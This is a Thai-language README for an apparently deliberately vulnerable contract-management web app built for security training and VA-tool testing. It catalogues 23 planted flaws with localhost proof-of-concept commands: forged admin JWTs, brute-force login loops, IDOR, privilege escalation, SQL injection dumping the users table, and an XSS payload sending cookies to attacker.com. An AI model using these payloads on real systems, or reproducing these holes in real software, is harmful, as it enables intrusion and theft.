# Contract Portal — สรุปช่องโหว่

> ⚠️ แอปนี้สร้างขึ้นเพื่อทดสอบ VA Tools และศึกษาด้านความปลอดภัยเท่านั้น

---

## ภาพรวม

| หมวด | จำนวนช่องโหว่ |
|------|--------------|
| API Security | 5 |
| Broken Authentication | 3 |
| Broken Access Control | 4 |
| Injection & XSS | 3 |
| Sensitive Data Exposure | 5 |
| Business Logic | 3 |
| **รวม** | **23** |

---

## 1. API Security

### #1 — Weak JWT Secret + No Expiry
- **ไฟล์:** `backend/main.py` บรรทัด 20–21
- **จุด:** `JWT_SECRET = "secret123"` / ไม่มี `exp` claim ใน token
- **ผลกระทบ:** ปลอม JWT ได้ง่าย / token ไม่มีวันหมดอายุ
- **PoC:**
```python
import jwt
token = jwt.encode({"user_id": 1, "username": "admin", "role": "admin"}, "secret123", algorithm="HS256")
```

---

### #2 — CORS Allow *
- **ไฟล์:** `backend/main.py` บรรทัด 35–41
- **จุด:** `allow_origins=["*"]`, `allow_methods=["*"]`, `allow_headers=["*"]`
- **ผลกระทบ:** ทุก origin สามารถเรียก API ได้ รวมถึงเว็บอันตราย

---

### #3 — Legacy Endpoint ไม่มี Auth
- **ไฟล์:** `backend/main.py` ฟังก์ชัน `get_users_v1_no_auth()`
- **จุด:** `GET /api/v1/users`
- **ผลกระทบ:** ดึงข้อมูลผู้ใช้ทั้งหมด (รวม password hash + api_key) โดยไม่ต้อง login
- **PoC:**
```bash
curl http://localhost:50000/api/v1/users
```

---

### #4 — Debug Endpoints เปิดเผยข้อมูลระบบ
- **ไฟล์:** `backend/main.py` ฟังก์ชัน `debug_info()` / `health()`
- **จุด:** `GET /api/debug` , `GET /api/health`
- **ผลกระทบ:**
  - `/api/debug` → leak `JWT_SECRET`, env vars ทั้งหมด, path ของ DB
  - `/api/health` → เปิดเผย package versions พร้อม CVE
- **PoC:**
```bash
curl http://localhost:50000/api/debug
```

---

### #5 — Outdated Dependencies (CVEs)
- **ไฟล์:** `backend/requirements.txt`, `frontend/package.json`

| Package | Version | CVE |
|---------|---------|-----|
| python-jose | 3.2.0 | CVE-2022-29217 (JWT algorithm confusion) |
| PyJWT | 1.7.1 | CVE-2022-29217 |
| cryptography | 3.3.2 | CVE-2023-23931, CVE-2023-49083 |
| python-multipart | 0.0.5 | CVE-2024-24762 (ReDoS) |
| requests | 2.25.1 | CVE-2023-32681 |
| axios (frontend) | 0.21.1 | CVE-2021-3749 (ReDoS) |

---

## 2. Broken Authentication

### #6 & #7 — No Rate Limit + No Account Lockout
- **ไฟล์:** `backend/main.py` ฟังก์ชัน `login()`
- **จุด:** `POST /api/login`
- **ผลกระทบ:** Brute force ได้ไม่จำกัด ไม่มี lockout ไม่มี CAPTCHA
- **PoC:**
```bash
for i in $(seq 1 1000); do
  curl -s -X POST http://localhost:50000/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"'$i'"}'
done
```

---

### #8 — Password Reset Token ไม่ Expire
- **ไฟล์:** `backend/main.py` ฟังก์ชัน `forgot_password()`
- **จุด:** `POST /api/forgot-password`
- **ผลกระทบ:**
  - Token สั้นแค่ 8 ตัวอักษร (brute force ได้)
  - Token ไม่มีวันหมดอายุ
  - Token ถูก return กลับมาใน response body โดยตรง (`debug_token`)
- **PoC:**
```bash
curl -s -X POST http://localhost:50000/api/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@company.com"}'
# Response จะมี "debug_token": "AbCd1234"
```

---

## 3. Broken Access Control

### #9 — IDOR (Read Contract)
- **ไฟล์:** `backend/main.py` ฟังก์ชัน `get_contract()`
- **จุด:** `GET /api/contracts/{id}`
- **ผลกระทบ:** ผู้ใช้คนใดก็ได้สามารถดู contract ของคนอื่นได้โดยแค่เปลี่ยน ID
- **PoC:**
```bash
# Login เป็น john แล้วดู contract ของ admin (id=1)
curl http://localhost:50000/api/contracts/1 \
  -H "Authorization: Bearer <john-token>"
```

---

### #10 — IDOR (Edit Contract)
- **ไฟล์:** `backend/main.py` ฟังก์ชัน `update_contract()`
- **จุด:** `PUT /api/contracts/{id}`
- **ผลกระทบ:** แก้ไข contract ของคนอื่นได้โดยไม่ต้องเป็นเจ้าของ
- **PoC:**
```bash
curl -X PUT http://localhost:50000/api/contracts/1 \
  -H "Authorization: Bearer <john-token>" \
  -H "Content-Type: application/json" \
  -d '{"title":"HACKED","amount":-99999}'
```

---

### #11 — Admin Endpoint ไม่ Check Role
- **ไฟล์:** `backend/main.py` ฟังก์ชัน `admin_list_users()`
- **จุด:** `GET /api/admin/users`
- **ผลกระทบ:** user ทั่วไป (ไม่ใช่ admin) เรียก endpoint นี้ได้ — ได้ข้อมูลทุก user พร้อม password hash
- **PoC:**
```bash
curl http://localhost:50000/api/admin/users \
  -H "Authorization: Bearer <john-token>"  # john เป็นแค่ user ธรรมดา
```

---

### #12 — Mass Assignment (Privilege Escalation)
- **ไฟล์:** `backend/main.py` ฟังก์ชัน `update_user()`
- **จุด:** `PUT /api/users/{id}`
- **ผลกระทบ:** ส่ง `"role": "admin"` เพิ่มสิทธิ์ตัวเองเป็น admin ได้
- **PoC:**
```bash
curl -X PUT http://localhost:50000/api/users/2 \
  -H "Authorization: Bearer <john-token>" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

---

## 4. Injection & XSS

### #13 — DOM-based XSS
- **ไฟล์:** `frontend/src/components/Dashboard.vue`
- **จุด 1:** URL hash → `window.location.hash` → `innerHTML`
- **จุด 2:** ช่อง Search → `searchLabel.innerHTML = this.searchQ`
- **PoC:**
```
http://localhost:7100/dashboard#<img src=x onerror=alert(document.cookie)>
```

---

### #14 — Stored XSS (Comments)
- **ไฟล์ backend:** `backend/main.py` ฟังก์ชัน `add_comment()` — ไม่ sanitize ก่อนบันทึก
- **ไฟล์ frontend:** `frontend/src/components/ContractDetail.vue` — render ด้วย `v-html`
- **จุด:** `POST /api/comments` → แสดงผลหน้า Contract Detail
- **PoC:**
```bash
curl -X POST http://localhost:50000/api/comments \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"contract_id":1,"content":"<script>fetch(\"http://attacker.com/?c=\"+document.cookie)</script>"}'
```

---

### #15 — SQL Injection
- **ไฟล์:** `backend/main.py` ฟังก์ชัน `search_contracts()`
- **จุด:** `GET /api/search?q=`
- **ผลกระทบ:** dump ข้อมูลทั้ง DB ได้ รวมถึง users table
- **PoC:**
```bash
curl "http://localhost:50000/api/search?q=%27%20UNION%20SELECT%20id,username,password,email,role,api_key,reset_token,created_at%20FROM%20users--" \
  -H "Authorization: Bearer <token>"
```

---

## 5. Sensitive Data Exposure

### #16 — Password Hash โผล่ใน API Response
- **ไฟล์:** `backend/main.py`
- **จุด:** `POST /api/login`, `GET /api/me`, `GET /api/admin/users`, `GET /api/v1/users`
- **ผลกระทบ:** MD5 hash (ไม่มี salt) ถูก return กลับมาทุก response — crack ได้ง่ายด้วย rainbow table

---

### #17 — Sensitive Data ใน localStorage
- **ไฟล์:** `frontend/src/components/Login.vue`
- **จุด:** หลัง login สำเร็จ
- **ข้อมูลที่เก็บ:** `token`, `role`, `api_key`, `username`, `user_id`
- **ผลกระทบ:** XSS ใดก็ได้สามารถขโมยข้อมูลทั้งหมดได้ผ่าน `localStorage.getItem()`

---

### #18 — Source Map เปิดใน Production
- **ไฟล์:** `frontend/vite.config.js` — `sourcemap: true`
- **จุด:** `http://localhost:7100/assets/*.js.map`
- **ผลกระทบ:** ดู source code Vue ต้นฉบับได้ทั้งหมด รวมถึง hardcoded key และ logic ต่างๆ
- **PoC:**
```bash
curl http://localhost:7100/assets/index.29072cfc.js.map
```

---

### #19 — Hardcoded API Key ใน Frontend
- **ไฟล์:** `frontend/src/components/Dashboard.vue` บรรทัด 63
- **จุด:** `const HARDCODED_PAYMENT_API_KEY = 'pk_live_corp_payment_abc123xyz456secret'`
- **ผลกระทบ:** เห็นได้จาก Source Map หรือ DevTools

---

### #20 — Stack Trace ใน Error Response
- **ไฟล์:** `backend/main.py` ฟังก์ชัน `search_contracts()`, `login()`
- **จุด:** เมื่อเกิด exception จะ return `traceback.format_exc()` และ raw SQL query
- **PoC:**
```bash
curl "http://localhost:50000/api/search?q='" \
  -H "Authorization: Bearer <token>"
```

---

## 6. Business Logic

### #21 — Negative Contract Amount
- **ไฟล์ backend:** `backend/main.py` ฟังก์ชัน `create_contract()`, `update_contract()`
- **ไฟล์ frontend:** `frontend/src/components/ContractList.vue`
- **จุด:** `POST /api/contracts`, `PUT /api/contracts/{id}`
- **ผลกระทบ:** สร้าง contract มูลค่าติดลบได้ ไม่มี validation ทั้งฝั่ง client และ server
- **PoC:**
```bash
curl -X POST http://localhost:50000/api/contracts \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"title":"Exploit","amount":-999999}'
```

---

### #22 — Skip Approval Workflow
- **ไฟล์ backend:** `backend/main.py` ฟังก์ชัน `update_contract()`
- **ไฟล์ frontend:** `frontend/src/components/ContractDetail.vue` — dropdown มี `approved` ให้เลือกตรงๆ
- **จุด:** `PUT /api/contracts/{id}` ส่ง `"status": "approved"`
- **ผลกระทบ:** ข้ามขั้นตอน approval ได้เลย ไม่ต้องให้ admin อนุมัติ
- **PoC:**
```bash
curl -X PUT http://localhost:50000/api/contracts/3 \
  -H "Authorization: Bearer <any-user-token>" \
  -H "Content-Type: application/json" \
  -d '{"status":"approved"}'
```

---

### #23 — Clickjacking (ไม่มี X-Frame-Options)
- **ไฟล์:** `frontend/nginx.conf`, `frontend/vite.config.js`
- **จุด:** ไม่มี header `X-Frame-Options` หรือ `Content-Security-Policy: frame-ancestors`
- **ผลกระทบ:** embed เว็บใน `<iframe>` บนหน้าเว็บอันตรายได้ → หลอกให้ user คลิก
- **PoC:**
```html
<iframe src="http://localhost:7100" width="800" height="600"></iframe>
```

---

## Test Accounts

| Username | Password | Role |
|----------|----------|------|
| admin | admin123 | admin |
| john | password123 | user |
| jane | jane2024 | user |
| bob | bob123 | user |

## Endpoints

| Service | URL |
|---------|-----|
| Frontend | http://localhost:7100 |
| Backend API | http://localhost:50000 |
| Swagger Docs | http://localhost:50000/docs |
| Debug (no auth) | http://localhost:50000/api/debug |
| Legacy (no auth) | http://localhost:50000/api/v1/users |
